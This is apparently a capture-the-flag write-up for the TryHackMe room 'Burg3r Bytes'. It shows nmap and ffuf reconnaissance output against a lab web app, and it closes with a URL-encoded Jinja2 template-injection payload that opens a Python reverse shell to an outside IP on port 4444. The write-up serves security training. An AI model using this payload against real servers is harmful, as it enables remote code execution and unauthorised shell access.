# TryHack3M: Burg3r Bytes

Completion Status: In progress
Difficulty Level: Hard
Tags: Web
Type: Challenege
URL: https://tryhackme.com/room/burg3rbytes

## Nmap Scan

```bash
╰─ nmap -p- --min-rate 1000 -T4 -sV -Pn -oA nmap_full_scan 10.48.154.147                                                                                                                 ─╯
Starting Nmap 7.95 ( https://nmap.org ) at 2026-03-11 14:21 IST
Nmap scan report for 10.48.154.147
Host is up (0.0085s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 8.2p1 Ubuntu 4ubuntu0.11 (Ubuntu Linux; protocol 2.0)
80/tcp open  http    Werkzeug httpd 3.0.2 (Python 3.8.10)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 15.13 seconds
```

## Fuzzing Directories

```bash
╰─ ffuf -u "http://10.48.154.147/FUZZ" -w /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt -r                                                                                 ─╯

        /'___\  /'___\           /'___\
       /\ \__/ /\ \__/  __  __  /\ \__/
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/
         \ \_\   \ \_\  \ \____/  \ \_\
          \/_/    \/_/   \/___/    \/_/

       v2.1.0-dev
________________________________________________

 :: Method           : GET
 :: URL              : http://10.48.154.147/FUZZ
 :: Wordlist         : FUZZ: /usr/share/wordlists/seclists/Discovery/Web-Content/big.txt
 :: Follow redirects : true
 :: Calibration      : false
 :: Timeout          : 10
 :: Threads          : 40
 :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
________________________________________________

basket                  [Status: 200, Size: 6081, Words: 1149, Lines: 86, Duration: 103ms]
checkout                [Status: 200, Size: 3095, Words: 585, Lines: 81, Duration: 79ms]
console                 [Status: 200, Size: 1563, Words: 330, Lines: 46, Duration: 52ms]
login                   [Status: 200, Size: 7724, Words: 2054, Lines: 101, Duration: 80ms]
register                [Status: 200, Size: 7773, Words: 2056, Lines: 101, Duration: 52ms]
:: Progress: [20481/20481] :: Job [1/1] :: 140 req/sec :: Duration: [0:00:46] :: Errors: 0 ::
```

![image.png](TryHack3M%20Burg3r%20Bytes/image.png)

![image.png](TryHack3M%20Burg3r%20Bytes/image%201.png)

![image.png](TryHack3M%20Burg3r%20Bytes/image%202.png)

![image.png](TryHack3M%20Burg3r%20Bytes/image%203.png)

![image.png](TryHack3M%20Burg3r%20Bytes/image%204.png)

![image.png](TryHack3M%20Burg3r%20Bytes/image%205.png)

![image.png](TryHack3M%20Burg3r%20Bytes/image%206.png)

## Get Reverse Shell

```json
{{%20cycler.__init__.__globals__.os.popen(%22python3%20-c%20%27import%20socket,os,pty;s=socket.socket();s.connect((\%22192.168.158.240\%22,4444));[os.dup2(s.fileno(),fd)%20for%20fd%20in%20(0,1,2)];pty.spawn(\%22/bin/sh\%22)%27%22).read()%20}}
```